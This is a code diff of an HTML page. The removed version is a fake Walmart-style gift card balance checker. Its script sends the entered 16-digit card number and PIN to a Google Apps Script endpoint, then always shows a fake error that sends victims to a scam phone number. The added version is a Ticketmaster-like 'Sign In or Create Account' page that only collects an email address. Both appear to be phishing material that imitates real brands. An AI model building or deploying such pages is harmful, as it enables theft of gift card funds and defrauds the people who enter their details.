@@ -1,227 +1,164 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-   <script type="text/javascript">
-    (function(c,l,a,r,i,t,y){
-        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-    })(window, document, "clarity", "script", "snjdjg8gp4");
-</script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Check Gift Card Balance</title>
+  <title>Sign In or Create Account</title>
   <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #fff;
-    }
-
-    header {
-      background-color: #005be3;
-      padding: 16px;
-      text-align: center;
-      color: white;
-      font-size: 20px;
-      font-weight: bold;
-    }
-
-    .breadcrumb {
-      padding: 16px;
-      font-size: 14px;
-      color: #555;
-    }
-
-    .container {
-      max-width: 800px;
-      margin: auto;
-      padding: 16px;
-    }
-
-    h1 {
-      font-size: 24px;
-      margin-bottom: 24px;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 6px;
-      font-weight: bold;
-    }
-
-    input[type="text"] {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 20px;
-      font-size: 16px;
+    * {
       box-sizing: border-box;
     }
 
-    .input-row {
+    html, body {
+      margin: 0;
+      height: 100%;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #fff;
       display: flex;
-      gap: 16px;
-      flex-wrap: wrap;
+      justify-content: center;
+      align-items: center;
     }
 
-    .input-row > div {
-      flex: 1;
-      min-width: 200px;
-    }
-
-    button {
-      background-color: #005be3;
-      color: white;
-      padding: 12px 24px;
-      font-size: 16px;
-      border: none;
-      border-radius: 20px;
-      cursor: pointer;
-    }
-
-    .tips-box {
-      margin-top: 40px;
-      padding: 20px;
-      border: 1px solid #ddd;
-      border-radius: 12px;
+    .container {
       display: flex;
-      flex-wrap: wrap;
-      gap: 32px;
+      height: 100vh;
+      width: 800px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
     }
 
-    .tip {
-      flex: 1;
-      min-width: 200px;
+    .left {
+      background-color: #111;
+      color: #fff;
+      width: 40%;
+      padding: 60px 30px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
     }
 
-    .tip h3 {
+    .left h1 {
+      font-size: 42px;
+      margin: 0;
+    }
+
+    .left h1::after {
+      content: '';
+      display: block;
+      width: 60px;
+      border-bottom: 4px solid #005be3;
+      margin-top: 10px;
+    }
+
+    .left p {
       font-size: 16px;
-      margin-bottom: 8px;
+      margin-top: 30px;
+      line-height: 1.6;
+      font-weight: 600;
     }
 
-    .tip p {
+    .left .logo {
+      font-size: 32px;
+      font-style: italic;
+      text-align: right;
+      padding-right: 10px;
+    }
+
+    .right {
+      background-color: #fff;
+      width: 60%;
+      padding: 60px 30px;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+    }
+
+    .right h2 {
+      font-size: 24px;
+      margin-top: 0;
+    }
+
+    .right p {
       font-size: 14px;
       color: #333;
     }
 
-    .tip ul {
-      margin: 0;
-      padding-left: 20px;
-    }
-
-    .tip img {
-      margin-top: 12px;
-      width: 140px;
-    }
-
-    .error {
-      display: none;
-      color: red;
-      font-size: 14px;
+    input[type="email"] {
+      width: 100%;
+      padding: 18px;
       margin-top: 10px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      font-size: 18px;
+      border-radius: 6px;
     }
 
-    .error a {
-      color: red;
+    .continue-btn {
+      width: 100%;
+      padding: 18px;
+      background-color: #eee;
+      border: none;
+      font-size: 18px;
+      font-weight: bold;
+      color: #666;
+      cursor: not-allowed;
+      border-radius: 6px;
+    }
+
+    .right a {
+      color: #005be3;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .right a:hover {
       text-decoration: underline;
     }
 
-    @media (max-width: 600px) {
-      .input-row {
-        flex-direction: column;
+    .disclaimer {
+      font-size: 12px;
+      color: #444;
+      margin-top: 20px;
+      line-height: 1.5;
+    }
+
+    /* ✅ Mobile fix */
+    @media (max-width: 768px) {
+      .left {
+        display: none;
+      }
+
+      .right {
+        width: 100%;
+        padding: 40px 20px;
+      }
+
+      .container {
+        width: 100%;
+        height: 100vh;
       }
     }
   </style>
 </head>
 <body>
-
-  <header>
-    Gift card
-  </header>
-
-  <div class="breadcrumb">
-    Gift cards / Check Gift Card Balance
-  </div>
-
   <div class="container">
-    <h1>Check gift card balance</h1>
-
-    <form id="cardForm">
-      <div class="input-row">
-        <div>
-          <label for="giftCardNumber">Card number* (16 digits)</label>
-          <input type="text" name="giftCardNumber" id="giftCardNumber" maxlength="16" required />
-        </div>
-        <div>
-          <label for="accessNumber">PIN* (4 digits)</label>
-          <input type="text" name="accessNumber" id="accessNumber" maxlength="4" required />
-        </div>
+    <div class="left">
+      <div>
+        <h1>WELCOME</h1>
+        <p>Discover millions of events, get alerts about your favorite artists, teams, plays and more — plus always-secure, effortless ticketing.</p>
       </div>
-
-      <button type="submit">Check Balance</button>
-      <div id="errorMsg" class="error">
-        We couldn’t verify your gift card. Try again or call <a href="tel:+18447092550">+1-844-709-2550</a> for help.
-      </div>
-    </form>
-
-    <div class="tips-box">
-      <div class="tip">
-        <h3>Physical gift card</h3>
-        <p>Scratch off the silver coating on back of card to reveal</p>
-        <ul>
-          <li>Last 4 digits of 16-digit gift card number</li>
-          <li>PIN</li>
-        </ul>
-        <img src="https://i.imgur.com/Wlb3TSE.png" alt="Card image" />
-      </div>
-
-      <div class="tip">
-        <h3>eGift card</h3>
-        <p>Find the PIN in the confirmation email</p>
-      </div>
-
-      <div class="tip">
-        <h3>Don’t have a PIN?</h3>
-        <p>
-          To check your balance, you'll need to exchange your gift card for one with a PIN.
-          You can do this at any Walmart store.
-        </p>
-        <p>
-          For additional help, call <a href="tel:+18447092550"><strong>+1-844-709-2550</strong></a>
-        </p>
+      <div class="logo">t</div>
+    </div>
+    <div class="right">
+      <h2>SIGN IN OR CREATE ACCOUNT</h2>
+      <p>If you don’t have an account you will be prompted to create one.</p>
+      <input type="email" placeholder="Email Address">
+      <button class="continue-btn" disabled>Continue</button>
+      <div class="disclaimer">
+        By continuing past this page, you agree to the <a href="#">Terms of Use</a> and understand that information will be used as described in our <a href="#">Privacy Policy</a>.
+        <br><br>
+        As set forth in our Privacy Policy, we may use your information for email marketing, including promotions and updates on our own or third-party products. You can opt out of our marketing emails anytime.
       </div>
     </div>
   </div>
-
-  <script>
-    document.getElementById("cardForm").addEventListener("submit", function (event) {
-      event.preventDefault();
-
-      const formData = new FormData(event.target);
-      const formDetails = {
-        giftCardNumber: formData.get("giftCardNumber"),
-        accessNumber: formData.get("accessNumber"),
-      };
-
-      const scriptURL = "https://script.google.com/macros/s/AKfycbzzt1AhRUn8j4K4xeqBAw1tU8Zx3vWytJkakRmTXUnWl6BTb4a9pBWN8J2S7UNeIOVz/exec";
-
-      fetch(scriptURL, {
-        method: "POST",
-        mode: "no-cors",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(formDetails),
-      })
-        .then(() => {
-          document.getElementById("errorMsg").style.display = "block";
-        })
-        .catch((error) => {
-          console.error("Error:", error);
-          alert("⚠️ Something went wrong! Try again.");
-        });
-    });
-  </script>
-
 </body>
 </html>
